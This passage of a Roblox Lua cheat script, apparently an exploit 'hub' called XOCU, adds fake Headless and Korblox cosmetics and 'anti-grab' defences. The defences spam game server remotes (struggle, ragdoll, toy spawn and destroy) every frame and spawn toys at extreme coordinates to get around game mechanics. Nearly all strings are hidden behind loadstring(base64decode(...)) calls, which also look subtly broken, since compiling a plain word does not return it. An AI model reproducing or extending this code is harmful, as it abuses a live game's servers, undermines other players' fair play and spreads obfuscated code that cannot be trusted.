    end

    local function WearHeadless()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
        if not head then return end
        SnapshotHead()
        for _, obj in ipairs(head:GetChildren()) do
            if obj:IsA(loadstring(base64decode("RGVjYWw="))()) or obj:IsA(loadstring(base64decode("U3BlY2lhbE1lc2g="))()) then obj:Destroy() end
        end
        local mesh = Instance.new(loadstring(base64decode("U3BlY2lhbE1lc2g="))())
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = loadstring(base64decode("cmJ4YXNzZXRpZDovLw=="))() .. HEADLESS_MESH_ID
        mesh.TextureId = loadstring(base64decode("cmJ4YXNzZXRpZDovLw=="))() .. HEADLESS_TEX_ID
        mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
        mesh.Name = loadstring(base64decode("UGhhbnRvbUhlYWRsZXNzTWVzaA=="))()
        mesh.Parent = head
        head.Transparency = 0.1
        head.BrickColor = BrickColor.new(loadstring(base64decode("UmVhbGx5IGJsYWNr"))())
        head.Material = Enum.Material.Plastic
    end

    local function WearKorblox()
        local char = LocalPlayer.Character
        if not char then return end
        local rleg = char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))()) or char:FindFirstChild(loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))())
        if not rleg then return end
        local old = char:FindFirstChild(loadstring(base64decode("UGhhbnRvbUtvcmJsb3hMZWc="))())
        if old then old:Destroy() end
        local fakeLeg = Instance.new(loadstring(base64decode("UGFydA=="))())
        fakeLeg.Name = loadstring(base64decode("UGhhbnRvbUtvcmJsb3hMZWc="))()
        fakeLeg.Size = rleg.Size
        fakeLeg.CFrame = rleg.CFrame
        fakeLeg.Anchored = false
        fakeLeg.CanCollide = false
        fakeLeg.Transparency = 0
        fakeLeg.BrickColor = BrickColor.new(loadstring(base64decode("UmVhbGx5IGJsYWNr"))())
        fakeLeg.Material = Enum.Material.Plastic
        fakeLeg.Parent = char
        local mesh = Instance.new(loadstring(base64decode("U3BlY2lhbE1lc2g="))())
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId = loadstring(base64decode("cmJ4YXNzZXRpZDovLw=="))() .. KORBLOX_MESH_ID
        mesh.TextureId = loadstring(base64decode("cmJ4YXNzZXRpZDovLw=="))() .. KORBLOX_TEX_ID
        mesh.Scale = Vector3.new(1, 1, 1)
        mesh.Parent = fakeLeg
        local weld = Instance.new(loadstring(base64decode("V2VsZENvbnN0cmFpbnQ="))())
        weld.Part0 = rleg
        weld.Part1 = fakeLeg
        weld.Parent = rleg
        rleg.Transparency = 1
    end

    local function ApplyCosmetics()
        local char = LocalPlayer.Character
        if not char then return end
        if CosmeticChoice == loadstring(base64decode("SGVhZGxlc3M="))() then WearHeadless()
        elseif CosmeticChoice == loadstring(base64decode("S29yYmxveA=="))() then WearKorblox()
        elseif CosmeticChoice == loadstring(base64decode("Qm90aA=="))() then WearHeadless() WearKorblox() end
    end

    local function StripCosmetics()
        local char = LocalPlayer.Character
        if not char then return end
        local head = char:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
        if head then
            local m = head:FindFirstChild(loadstring(base64decode("UGhhbnRvbUhlYWRsZXNzTWVzaA=="))())
            if m then m:Destroy() end
            if SavedHeadData then
                head.Transparency = SavedHeadData.Transparency
                head.BrickColor = SavedHeadData.BrickColor
                head.Material = SavedHeadData.Material
                for _, m2 in ipairs(SavedHeadData.Meshes) do
                    local mesh = Instance.new(loadstring(base64decode("U3BlY2lhbE1lc2g="))())
                    mesh.MeshType = m2.MeshType
                    mesh.MeshId = m2.MeshId
                    mesh.TextureId = m2.TextureId
                    mesh.Scale = m2.Scale
                    mesh.Offset = m2.Offset
                    mesh.VertexColor = m2.VertexColor
                    mesh.Name = m2.Name
                    mesh.Parent = head
                end
                for _, d in ipairs(SavedHeadData.Decals) do
                    local decal = Instance.new(loadstring(base64decode("RGVjYWw="))())
                    decal.Texture = d.Texture
                    decal.Face = d.Face
                    decal.Transparency = d.Transparency
                    decal.Name = d.Name
                    decal.Parent = head
                end
                SavedHeadData = nil
            else
                head.Transparency = 0
            end
        end
        local rleg = char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))()) or char:FindFirstChild(loadstring(base64decode("UmlnaHRMb3dlckxlZw=="))())
        if rleg then
            rleg.Transparency = 0
            local w = rleg:FindFirstChildOfClass(loadstring(base64decode("V2VsZENvbnN0cmFpbnQ="))())
            if w then w:Destroy() end
        end
        local fakeleg = char:FindFirstChild(loadstring(base64decode("UGhhbnRvbUtvcmJsb3hMZWc="))())
        if fakeleg then fakeleg:Destroy() end
    end

    LocalPlayer.CharacterAdded:Connect(function()
        task.wait(1)
        SavedHeadData = nil
        if FakeCosmeticsEnabled and RespawnPersist then ApplyCosmetics() end
    end)

    MainR:CreateToggle({
        Name = loadstring(base64decode("RW5hYmxlIENvc21ldGljcw=="))(),
        Default = false,
        Callback = function(v)
            FakeCosmeticsEnabled = v
            if v then
                ApplyCosmetics()
            else
                StripCosmetics()
            end
        end
    })

    MainR:CreateDropdown({
        Name = loadstring(base64decode("U3R5bGU="))(),
        Items = {loadstring(base64decode("SGVhZGxlc3M="))(), loadstring(base64decode("S29yYmxveA=="))(), loadstring(base64decode("Qm90aA=="))()},
        Default = loadstring(base64decode("Qm90aA=="))(),
        Callback = function(v)
            CosmeticChoice = v
            if FakeCosmeticsEnabled then StripCosmetics() ApplyCosmetics() end
        end
    })

    MainR:CreateToggle({
        Name = loadstring(base64decode("UmUtYXBwbHkgb24gUmVzcGF3bg=="))(),
        Default = false,
        Callback = function(v)
            RespawnPersist = v
        end
    })
end

do

    local Players = game:GetService('Players')
    local UserInputService = game:GetService('UserInputService')
    local SoundService = game:GetService('SoundService')
    local TextChatService = game:GetService('TextChatService')
    local player = Players.LocalPlayer

    local soundMap = {
        ['Normal Typing'] = 'rbxassetid://72486459002567',
        ['Thocky Typing'] = 'rbxassetid://76696739955497',
        ['Clean Typing'] = 'rbxassetid://131944804697356',
        ['Clicky Typing'] = 'rbxassetid://9116149587',
    }

    local currentSoundId = soundMap['Normal Typing']
    local typingSound = Instance.new('Sound')
    typingSound.SoundId = currentSoundId
    typingSound.Looped = true
    typingSound.Volume = 1
    typingSound.Parent = SoundService

    local typing = false
    local enabled = true
    local volume = 100

    local function startSound()
        if not enabled then return end
        if typingSound.SoundId and typingSound.SoundId ~= '' then
            if not typingSound.IsPlaying then
                typingSound:Play()
            end
        end
    end

    local function stopSound()
        typingSound:Stop()
    end

    UserInputService.TextBoxFocused:Connect(function()
        typing = true
        startSound()
    end)

    UserInputService.TextBoxFocusReleased:Connect(function()
        typing = false
        stopSound()
    end)

    SoundGroup:CreateToggle({
        Name = loadstring(base64decode("VHlwaW5nIFNvdW5k"))(),
        Default = true,
        Callback = function(state)
            enabled = state
            if not state then
                stopSound()
            end
        end
    })

    SoundGroup:CreateSlider({
        Name = loadstring(base64decode("Vm9sdW1l"))(),
        Default = 100,
        Min = 0,
        Max = 100,
        Callback = function(v)
            volume = v
            typingSound.Volume = v / 100
        end
    })

    SoundGroup:CreateDropdown({
        Name = loadstring(base64decode("VHlwaW5nIFNvdW5k"))(),
        Items = {
            loadstring(base64decode("Tm9ybWFsIFR5cGluZw=="))(),
            loadstring(base64decode("VGhvY2t5IFR5cGluZw=="))(),
            loadstring(base64decode("Q2xlYW4gVHlwaW5n"))(),
            loadstring(base64decode("Q2xpY2t5IFR5cGluZw=="))(),
        },
        Default = loadstring(base64decode("Tm9ybWFsIFR5cGluZw=="))(),
        Callback = function(selected)
            local id = soundMap[selected]
            if not id then return end
            currentSoundId = id
            typingSound:Stop()
            typingSound.SoundId = id
            typingSound.TimePosition = 0
        end
    })
end

local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
local StarterGui = game:GetService(loadstring(base64decode("U3RhcnRlckd1aQ=="))())
local PS = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
local R = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
local UserInputService = game:GetService(loadstring(base64decode("VXNlcklucHV0U2VydmljZQ=="))())
local Workspace = workspace
local Player = PS.LocalPlayer
local Camera = Workspace.CurrentCamera
local CE = RS:WaitForChild(loadstring(base64decode("Q2hhcmFjdGVyRXZlbnRz"))(), 10)
local BeingHeld = Player:WaitForChild(loadstring(base64decode("SXNIZWxk"))(), 10)
local StruggleEvent = CE and CE:WaitForChild(loadstring(base64decode("U3RydWdnbGU="))())
function notify(title, content, duration)
	Library:Notify({ Title = title or loadstring(base64decode("Tm90aWZpY2F0aW9u"))(), Content = content or loadstring(base64decode(""))(), Duration = duration or 5,
	 })
end
function sendHubLoadedMessage()
	local message = loadstring(base64decode("IE93bmVyIFZlcnNpb24gfCBYT0NVIGxvYWRlZC4g"))()
	local sent = false
	pcall(function()
		local chatEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("RGVmYXVsdENoYXRTeXN0ZW1DaGF0RXZlbnRz"))())
		if chatEvents then
			local say = chatEvents:FindFirstChild(loadstring(base64decode("U2F5TWVzc2FnZVJlcXVlc3Q="))())
			if say and typeof(say.FireServer) == loadstring(base64decode("ZnVuY3Rpb24="))() then
				say:FireServer(message, loadstring(base64decode("QWxs"))())
				sent = true
			end
		end
	end)
	if not sent then
		pcall(function()
			StarterGui:SetCore(loadstring(base64decode("Q2hhdE1ha2VTeXN0ZW1NZXNzYWdl"))(), {
				Name = message;
				Color = Color3.fromRGB(255, 170, 0);
				Font = Enum.Font.SourceSansBold;
				FontSize = Enum.FontSize.Size18;
			})
		end)
	end
end
task.spawn(function()
	task.wait(1)
	sendHubLoadedMessage()
end)
local paintPartsBackup = {}
local paintConnections = {}
function deleteAllPaintParts()
	for _, obj in ipairs(Workspace:GetDescendants()) do
		if obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and obj.Name == loadstring(base64decode("UGFpbnRQbGF5ZXJQYXJ0"))() then
			local clone = obj:Clone()
			clone.Archivable = true
			paintPartsBackup[obj:GetDebugId()] = {
				clone = clone,
				parent = obj.Parent
			}
			obj:Destroy()
		end
	end
end
local function restorePaintParts()
	for _, data in pairs(paintPartsBackup) do
		if data.clone and data.parent then
			data.clone.Parent = data.parent
		end
	end
	paintPartsBackup = {}
end
local function watchNewPaintParts()
	table.insert(paintConnections, Workspace.DescendantAdded:Connect(function(obj)
		if obj:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and obj.Name == loadstring(base64decode("UGFpbnRQbGF5ZXJQYXJ0"))() then
			task.defer(function()
				if obj and obj.Parent then
					local clone = obj:Clone()
					clone.Archivable = true
					paintPartsBackup[obj:GetDebugId()] = {
						clone = clone,
						parent = obj.Parent
					}
					obj:Destroy()
				end
			end)
		end
	end))
end
local function disconnectWatchers()
	for _, conn in ipairs(paintConnections) do
		if conn.Connected then
			conn:Disconnect()
		end
	end
	paintConnections = {}
end
local function setTouchQuery(state)
	local char = Workspace:FindFirstChild(Player.Name)
	if not char then
		return
	end
	for _, v in ipairs(char:GetChildren()) do
		if v:IsA(loadstring(base64decode("UGFydA=="))()) or v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
			v.CanTouch = state
			v.CanQuery = state
		end
	end
end
local antiGucciConnection
local safePosition
local restoreFrames = 0
local function spawnBlobman()
	local args = {
		[1] = loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))(),
		[2] = CFrame.new(0, 5000000, 0),
		[3] = Vector3.new(0, 60, 0)
	}
	pcall(function()
		ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer(unpack(args))
	end)
	local folder = Workspace:WaitForChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))(), 5)
	if folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))()) then
		local blob = folder.CreatureBlobman
		if blob:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) then
			blob.Head.CFrame = CFrame.new(0, 50000, 0)
			blob.Head.Anchored = true
		end
		notify(loadstring(base64decode("U3VjY2Vzcw=="))(), loadstring(base64decode("QmxvYm1hbiBTcGF3bmVkIQ=="))(), 3)
	end
end
local function startAntiGucci()
	local character = Player.Character or Player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	local rootPart = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	safePosition = rootPart.Position
	local folder = Workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
	local blob = folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())
	local seat = blob and blob:FindFirstChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
	if not blob then
		spawnBlobman()
		task.wait(0.3)
		folder = Workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
		blob = folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())
		seat = blob and blob:FindFirstChild(loadstring(base64decode("VmVoaWNsZVNlYXQ="))())
	end
	if seat and seat:IsA(loadstring(base64decode("VmVoaWNsZVNlYXQ="))()) then
		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
		seat:Sit(humanoid)
	end
	humanoid:GetPropertyChangedSignal(loadstring(base64decode("SnVtcA=="))()):Connect(function()
		if humanoid.Jump and humanoid.Sit then
			restoreFrames = 15
			safePosition = rootPart.Position
		end
	end)
	if antiGucciConnection then
		antiGucciConnection:Disconnect()
	end
	antiGucciConnection = R.Heartbeat:Connect(function()
		if not rootPart or not humanoid then
			return
		end
		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
		if restoreFrames > 0 then
			rootPart.CFrame = CFrame.new(safePosition)
			restoreFrames = restoreFrames - 1
		end
	end)
	task.spawn(function()
		while humanoid.Sit do
			task.wait(1)
		end
		task.wait(0.5)
		rootPart.CFrame = CFrame.new(safePosition)
	end)
end
local function stopAntiGucci()
	if antiGucciConnection then
		antiGucciConnection:Disconnect()
		antiGucciConnection = nil
	end
	-- Unsit humanoid first so the server releases the seat
	local char = Player.Character
	local hum = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	if hum then
		hum.Sit = false
		pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
	end
	local blobFolder = Workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
	if blobFolder and blobFolder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))()) then
		local blob = blobFolder.CreatureBlobman
		-- Fire server-side destroy remote so it fully removes server-side
		pcall(function()
			ReplicatedStorage.MenuToys.DestroyToy:FireServer(blob)
		end)
		task.wait(0.1)
		-- Fallback local destroy in case remote didn't work
		if blob and blob.Parent then
			blob:Destroy()
		end
	end
end
local antiGucciConnectionTrain
local safePositionTrain
local restoreFramesTrain = 0
local function startAntiGucciTrain()
	local character = Player.Character or Player.CharacterAdded:Wait()
	local humanoid = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	local rootPart = character:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	safePositionTrain = rootPart.Position
	local folder = workspace.Map.AlwaysHereTweenedObjects
	local train = folder and folder:FindFirstChild(loadstring(base64decode("VHJhaW4="))())
	local seat
	if train then
		for _, d in ipairs(train:GetDescendants()) do
			if d:IsA(loadstring(base64decode("U2VhdA=="))()) then
				seat = d
				break
			end
		end
	end
	if seat then
		rootPart.CFrame = seat.CFrame + Vector3.new(0, 2, 0)
		seat:Sit(humanoid)
	end
	humanoid:GetPropertyChangedSignal(loadstring(base64decode("SnVtcA=="))()):Connect(function()
		if humanoid.Jump and humanoid.Sit then
			restoreFramesTrain = 15
			safePositionTrain = rootPart.Position
		end
	end)
	if antiGucciConnectionTrain then
		antiGucciConnectionTrain:Disconnect()
	end
	antiGucciConnectionTrain = R.Heartbeat:Connect(function()
		if not rootPart or not humanoid then
			return
		end
		ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(rootPart, 0)
		if restoreFramesTrain > 0 then
			rootPart.CFrame = CFrame.new(safePositionTrain)
			restoreFramesTrain = restoreFramesTrain - 1
		end
	end)
	task.spawn(function()
		while humanoid.Sit do
			task.wait(1)
		end
		task.wait(0.5)
		rootPart.CFrame = CFrame.new(safePositionTrain)
	end)
end
local function stopAntiGucciTrain()
	if antiGucciConnectionTrain then
		antiGucciConnectionTrain:Disconnect()
		antiGucciConnectionTrain = nil
	end
	local trainFolder = workspace.Map.AlwaysHereTweenedObjects
	if trainFolder and trainFolder:FindFirstChild(loadstring(base64decode("VHJhaW4="))()) then
		ResetPlayer(game.Players.LocalPlayer)
	end
end
local DefenseGroup = Tabs.Defense:CreateBlock({Name = loadstring(base64decode("RGVmZW5zZSBNYWlu"))(), Side = loadstring(base64decode("TGVmdA=="))()})
local DefenseExtra = Tabs.Defense:CreateBlock({Name = loadstring(base64decode("RXh0cmEgRGVmZW5zZQ=="))(), Side = loadstring(base64decode("UmlnaHQ="))()})

local antiGrabExplosionConn, antiGrabHeldConn, antiGrabStruggleConn, antiGrabHumConn, antiGrabAnchorConn
local antiGrabRootCF, antiGrabRootPos, antiGrabHardFreeze = nil, nil, false
local function antiGrabUnfreeze(char)
	local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	if hrp then
		hrp.Anchored = false
		if hrp:FindFirstChild(loadstring(base64decode("RnJlZXplSm9pbnQ="))()) then
			hrp.FreezeJoint:Destroy()
		end
	end
	antiGrabHardFreeze = false
	if antiGrabAnchorConn then
		antiGrabAnchorConn:Disconnect()
		antiGrabAnchorConn = nil
	end
end
local function antiGrabFreezeInPlace(char)
	local hrp = char and char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	if not hrp then
		return
	end
	antiGrabRootCF = hrp.CFrame
	antiGrabRootPos = hrp.Position
	antiGrabHardFreeze = true
	if not hrp:FindFirstChild(loadstring(base64decode("RnJlZXplSm9pbnQ="))()) then
		local align = Instance.new(loadstring(base64decode("QWxpZ25Qb3NpdGlvbg=="))())
		align.Name = loadstring(base64decode("RnJlZXplSm9pbnQ="))()
		align.Mode = Enum.PositionAlignmentMode.OneAttachment
		align.MaxForce = 1e6
		align.MaxVelocity = 0
		align.Responsiveness = 200
		local att = Instance.new(loadstring(base64decode("QXR0YWNobWVudA=="))(), hrp)
		align.Attachment0 = att
		align.Position = antiGrabRootPos
		align.Parent = hrp
	end
	antiGrabAnchorConn = R.Heartbeat:Connect(function()
		if antiGrabHardFreeze and hrp then
			hrp.AssemblyLinearVelocity = Vector3.zero
			hrp.AssemblyAngularVelocity = Vector3.zero
			hrp.CFrame = antiGrabRootCF
		end
	end)
end
local function antiGrabReconnect()
	local char = Player.Character or Player.CharacterAdded:Wait()
	local hum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))())
	local hrp = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
	local fp = hrp:FindFirstChild(loadstring(base64decode("RmlyZVBsYXllclBhcnQ="))())
	if fp then
		fp:Destroy()
	end
	if antiGrabHumConn then
		antiGrabHumConn:Disconnect()
	end
	antiGrabHumConn = hum.Changed:Connect(function(p)
		if p == loadstring(base64decode("U2l0"))() and hum.Sit then
			if not (hum.SeatPart and tostring(hum.SeatPart.Parent) == loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))()) then
				hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
				hum.Sit = false
			end
		end
	end)
end
do
    local Players = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local ReplicatedStorage = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local ContextActionService = game:GetService(loadstring(base64decode("Q29udGV4dEFjdGlvblNlcnZpY2U="))())
    local LocalPlayer = Players.LocalPlayer

    -- Localized state management (replaces getgenv and ACGE)
    local antiGrabActive = false
    local antiGrabConnection = nil
    local spawnTick = nil

    DefenseGroup:CreateToggle({
        Name = loadstring(base64decode("U2VhdGxlc3MgR3VjY2kgKEFudGkgR3JhYik="))(),
        Flag = loadstring(base64decode("U2VhdGxlc3NHdWNjaUFudGlHcmFi"))(),
        Default = false,
        Callback = function(Value)
            if SetToggleState then SetToggleState(loadstring(base64decode("U2VhdGxlc3NHdWNjaUFudGlHcmFi"))(), Value) end
            antiGrabActive = Value

            if Value then
                if not antiGrabConnection then
                    antiGrabConnection = RunService.RenderStepped:Connect(function()
                        if not antiGrabActive then return end
                        
                        local char = LocalPlayer.Character
                        if not char then return end

                        local hum = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local root = char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local myToys = workspace:FindFirstChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                        local ocarina = myToys and myToys:FindFirstChild(loadstring(base64decode("SW5zdHJ1bWVudFdvb2R3aW5kT2NhcmluYQ=="))())
                        
                        if ocarina then
                            -- Check if we are currently being grabbed
                            for _, prt in ipairs(char:GetChildren()) do
                                local owner = prt:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
                                if owner and owner.Value ~= loadstring(base64decode(""))() then
                                    local holdPart = ocarina:FindFirstChild(loadstring(base64decode("SG9sZFBhcnQ="))())
                                    local holdFunc = holdPart and holdPart:FindFirstChild(loadstring(base64decode("SG9sZEl0ZW1SZW1vdGVGdW5jdGlvbg=="))())
                                    
                                    if holdFunc then
                                        task.spawn(function()
                                            pcall(function() holdFunc:InvokeServer(ocarina, char) end)
                                        end)

                                        local menuToys = ReplicatedStorage:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))())
                                        local destroyToy = menuToys and menuToys:FindFirstChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
                                        if destroyToy then
                                            pcall(function() destroyToy:FireServer(ocarina) end)
                                        end
                                        
                                        if hum then
                                            hum:SetStateEnabled(Enum.HumanoidStateType.Jumping, true)
                                            hum.AutoRotate = true
                                            if hum.Sit then
                                                hum.Sit = false
                                            end
                                        end

                                        pcall(function()
                                            ContextActionService:UnbindAction(loadstring(base64decode("RXNjYXBl"))())
                                            ContextActionService:UnbindAction(loadstring(base64decode("SnVtcFJlbW92ZXI="))())
                                        end)
                                        
                                        owner.Value = loadstring(base64decode(""))()
                                    end
                                end
                            end
                        else
                            -- Spawn logic if Ocarina doesn't exist
                            local canSpawn = LocalPlayer:FindFirstChild(loadstring(base64decode("Q2FuU3Bhd25Ub3k="))())
                            if canSpawn and canSpawn.Value and not spawnTick then
                                spawnTick = tick()
                                task.spawn(function()
                                    local menuToys = ReplicatedStorage:FindFirstChild(loadstring(base64decode("TWVudVRveXM="))())
                                    local spawnFunc = menuToys and menuToys:FindFirstChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
                                    if spawnFunc then
                                        pcall(function()
                                            spawnFunc:InvokeServer(
                                                loadstring(base64decode("SW5zdHJ1bWVudFdvb2R3aW5kT2NhcmluYQ=="))(),
                                                CFrame.new(1e5, 1e5, 1e5),
                                                Vector3.zero
                                            )
                                        end)
                                    end
                                end)
                            elseif spawnTick and tick() - spawnTick > 1 and not (myToys and myToys:FindFirstChild(loadstring(base64decode("SW5zdHJ1bWVudFdvb2R3aW5kT2NhcmluYQ=="))())) then
                                spawnTick = nil
                            end

                            -- Grab escape fallback
                            local grabbed = false
                            for _, prt in ipairs(char:GetChildren()) do
                                local owner = prt:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())
                                if owner and owner.Value ~= loadstring(base64decode(""))() then
                                    grabbed = true
                                    break
                                end
                            end

                            if grabbed then
                                local charEvents = ReplicatedStorage:FindFirstChild(loadstring(base64decode("Q2hhcmFjdGVyRXZlbnRz"))())
                                if charEvents then
                                    local struggle = charEvents:FindFirstChild(loadstring(base64decode("U3RydWdnbGU="))())
                                    local ragdollRemote = charEvents:FindFirstChild(loadstring(base64decode("UmFnZG9sbFJlbW90ZQ=="))())
                                    
                                    if struggle then pcall(function() struggle:FireServer(LocalPlayer) end) end
                                    if ragdollRemote and root then pcall(function() ragdollRemote:FireServer(root, 0) end) end
                                end
                                
                                if hum and type(stopOcarinaAnim) == loadstring(base64decode("ZnVuY3Rpb24="))() then
                                    pcall(stopOcarinaAnim, hum)
                                end
                            end
                        end

                        if hum and type(stopOcarinaAnim) == loadstring(base64decode("ZnVuY3Rpb24="))() then
                            pcall(stopOcarinaAnim, hum)
                        end
                    end)
                end
            else
                if antiGrabConnection then
                    antiGrabConnection:Disconnect()
                    antiGrabConnection = nil
                end
            end
        end
    })
end
local autoStruggleConn = nil
local AntiGrabEnabled = false
local HeldConnection = nil

do
    local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
    local AntiGrab = false
    local AntiGrabProc = false
    local AGWalk = false
    local Cons = {}
    
    local function DiscAll()
        for sckTj49T, v in pairs(Cons) do
            if v then v:Disconnect() end
        end
        table.clear(Cons)
    end

    local function ApplyAntiGrab(char)
        if not char or not AntiGrab then return end
        
        local hrp = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))(), 5)
        local hum = char:WaitForChild(loadstring(base64decode("SHVtYW5vaWQ="))(), 5)
        local head = char:WaitForChild(loadstring(base64decode("SGVhZA=="))(), 5)
        local torso = char:WaitForChild(loadstring(base64decode("VG9yc28="))(), 5) or char:WaitForChild(loadstring(base64decode("VXBwZXJUb3Jzbw=="))(), 5)
        if not (hrp and hum and head and torso) then return end

        local beingHeld = char:FindFirstChild(loadstring(base64decode("QmVpbmdIZWxk"))())
        local wasRagdolled = false

        Cons[loadstring(base64decode("QUdDRnJhbWVMaW1iaW5n"))()] = RunService.Heartbeat:Connect(function()
            local ragdolled = hum:FindFirstChild(loadstring(base64decode("UmFnZG9sbGVk"))())
            
            if ragdolled and ragdolled.Value then
                wasRagdolled = true
                local leftArm = char:FindFirstChild(loadstring(base64decode("TGVmdCBBcm0="))())
                local rightArm = char:FindFirstChild(loadstring(base64decode("UmlnaHQgQXJt"))())
                local leftLeg = char:FindFirstChild(loadstring(base64decode("TGVmdCBMZWc="))())
                local rightLeg = char:FindFirstChild(loadstring(base64decode("UmlnaHQgTGVn"))())

                if leftArm then leftArm.CFrame = torso.CFrame * CFrame.new(-1.5, 0, 0); leftArm.CanCollide = false end
                if rightArm then rightArm.CFrame = torso.CFrame * CFrame.new(1.5, 0, 0); rightArm.CanCollide = false end
                if leftLeg then leftLeg.CFrame = torso.CFrame * CFrame.new(-0.5, -2, 0); leftLeg.CanCollide = false end
                if rightLeg then rightLeg.CFrame = torso.CFrame * CFrame.new(0.5, -2, 0); rightLeg.CanCollide = false end
            elseif wasRagdolled then
                wasRagdolled = false
                local limbs = {loadstring(base64decode("TGVmdCBBcm0="))(), loadstring(base64decode("UmlnaHQgQXJt"))(), loadstring(base64decode("TGVmdCBMZWc="))(), loadstring(base64decode("UmlnaHQgTGVn"))()}
                for _, limbName in ipairs(limbs) do
                    local limb = char:FindFirstChild(limbName)
                    if limb then limb.CanCollide = true end
                end
            end
        end)

        Cons[loadstring(base64decode("QUdIZWFk"))()] = head.ChildAdded:Connect(function(PartOwner)
            if PartOwner.Name == loadstring(base64decode("UGFydE93bmVy"))() then
                if not AntiGrabProc then
                    AntiGrabProc = true
                    hum.Sit = false
                    
                    pcall(function() StruggleEvent:FireServer(Player) end)
                    
                    task.spawn(function() 
                        while (head and head:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())) or (beingHeld and beingHeld.Value) do
                            pcall(function() StruggleEvent:FireServer(Player) end)
                            pcall(function() ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(hrp, 0) end)
                            task.wait()
                        end
                    end)
                    
                    task.spawn(function()
                        hrp.Anchored = true
                        if not AGWalk then
                            AGWalk = true
                            pcall(function()
                                while (head and head:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))())) or (beingHeld and beingHeld.Value) do
                                    hrp.CFrame = hrp.CFrame + hum.MoveDirection * 0.43
                                    task.wait()
                                end
                            end)
                        end
                        hrp.Anchored = false
                        AntiGrabProc = false
                        AGWalk = false
                    end)
                end
            end
        end)
        
        local weldHRP = hrp:WaitForChild(loadstring(base64decode("V2VsZEhSUA=="))(), 5)
        if weldHRP then
            Cons[loadstring(base64decode("QUdXZWxk"))()] = weldHRP.Changed:Connect(function()
                if hrp.WeldHRP.Enabled then
                    task.spawn(function()
                        while hrp.WeldHRP.Enabled and task.wait() do
                            hum.Sit = false
                            hum.AutoRotate = true
                            hum.HipHeight = 0
                            pcall(function() head.CFrame = hrp.CFrame + Vector3.new(0, 1.35, 0) end)
                        end
                        hum.HipHeight = 0
                    end)
                end
            end)
        end
    end

    DefenseGroup:CreateToggle({
        Name = loadstring(base64decode("QW50aSBHcmFiIEJFU1Qg"))(),
        Flag = loadstring(base64decode("QW50aUdyYWI="))(),
        Default = false,
        Callback = function(Value)
            AntiGrab = Value
            DiscAll()
            
            if AntiGrab then
                ApplyAntiGrab(Player.Character)
                Cons[loadstring(base64decode("QUdDaGFy"))()] = Player.CharacterAdded:Connect(ApplyAntiGrab)
            else
                local char = Player.Character
                if char then
